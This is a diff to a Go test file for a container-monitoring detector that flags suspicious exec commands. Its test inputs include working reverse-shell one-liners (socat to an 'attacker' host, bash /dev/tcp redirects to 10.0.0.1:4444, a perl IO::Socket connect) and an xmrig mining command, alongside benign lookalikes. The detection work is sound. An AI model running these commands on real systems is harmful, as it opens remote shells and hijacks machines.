@@ -32,6 +32,13 @@ func TestMatchSuspiciousExec_SocatExec(t *testing.T) {
 	}
 }
 
+func TestMatchSuspiciousExec_SocatSystem(t *testing.T) {
+	cmd := "socat openssl:attacker:443 system:sh"
+	if p := match(cmd); p != "socat-system" {
+		t.Errorf("cmd=%q: got %q, want socat-system", cmd, p)
+	}
+}
+
 func TestMatchSuspiciousExec_Xmrig(t *testing.T) {
 	cmd := "/tmp/xmrig --pool pool.minexmr.com:4444"
 	if p := match(cmd); p != "xmrig" {
@@ -40,9 +47,46 @@ func TestMatchSuspiciousExec_Xmrig(t *testing.T) {
 }
 
 func TestMatchSuspiciousExec_BashTcpRedirect(t *testing.T) {
-	cmd := "bash -c 'exec /dev/tcp/10.0.0.1/4444'"
-	if p := match(cmd); p != "bash-tcp-redirect" {
-		t.Errorf("cmd=%q: got %q, want bash-tcp-redirect", cmd, p)
+	// Any remote /dev/tcp endpoint matches — bash also connects through quotes,
+	// variables, `>|` and escapes, so a redirect operator isn't required.
+	for _, cmd := range []string{
+		`bash -c exec 3<>"/dev/tcp/10.0.0.1/4444"; cat <&3 | sh >&3 2>&3`,
+		`bash -c d=/dev/tcp/10.0.0.1/4444; exec 3<>$d; sh <&3 >&3 2>&3`,
+		`bash -c exec 3>|/dev/tcp/10.0.0.1/4444`,
+		"bash -c 'exec 5<>/dev/tcp/10.0.0.1/4444'",
+		"bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'",
+	} {
+		if p := match(cmd); p != "bash-tcp-redirect" {
+			t.Errorf("cmd=%q: got %q, want bash-tcp-redirect", cmd, p)
+		}
+	}
+}
+
+// Benign commands that merely mention /dev/tcp/, probe a loopback port, or load
+// a non-socket IO::* module must not match (HIGH auto-pauses the container).
+func TestMatchSuspiciousExec_BenignLookalikes(t *testing.T) {
+	for _, cmd := range []string{
+		"bash -c 'grep -rn /dev/tcp/ docs'",
+		"bash -c 'rg -n \"/dev/tcp/\" internal/'",
+		"bash -c '</dev/tcp/localhost/5432'",
+		"bash -c 'echo > /dev/tcp/127.0.0.1/8080'",
+		"perl -MIO::File -e 'print 1'",
+		"perl -MIO::Handle -e 'print 1'",
+	} {
+		if p := match(cmd); p != "" {
+			t.Errorf("cmd=%q: got %q, want no match", cmd, p)
+		}
+	}
+}
+
+func TestMatchSuspiciousExec_PerlIOSocket(t *testing.T) {
+	for _, cmd := range []string{
+		"perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"10.0.0.1:4444\")'",
+		"perl -MIO::Socket::INET -e 'print 1'",
+	} {
+		if p := match(cmd); p != "perl-socket" {
+			t.Errorf("cmd=%q: got %q, want perl-socket", cmd, p)
+		}
 	}
 }
 
@@ -271,5 +315,17 @@ func TestGTFOBinsStripPlaceholders(t *testing.T) {
 		if got != tc.want {
 			t.Errorf("gtfobinsStripPlaceholders(%q) = %q, want %q", tc.in, got, tc.want)
 		}
+	}
+}
+
+// The keyword refinement applies to GTFOBins-derived patterns too, not just the
+// compiled-in defaults.
+func TestMatchSuspiciousExec_RefinesGTFOBinsKeywords(t *testing.T) {
+	gtfo := []execPattern{{Name: "bash-reverse-shell", Arg0: "bash", Keywords: []string{"/dev/tcp/"}}}
+	if p := matchSuspiciousExec("bash -c 'grep -rn /dev/tcp/ docs'", gtfo); p != "" {
+		t.Errorf("mention of /dev/tcp/ matched %q", p)
+	}
+	if p := matchSuspiciousExec("bash -c 'sh -i >& /dev/tcp/10.0.0.1/4444 0>&1'", gtfo); p != "bash-reverse-shell" {
+		t.Errorf("real redirect: got %q, want bash-reverse-shell", p)
 	}
 }
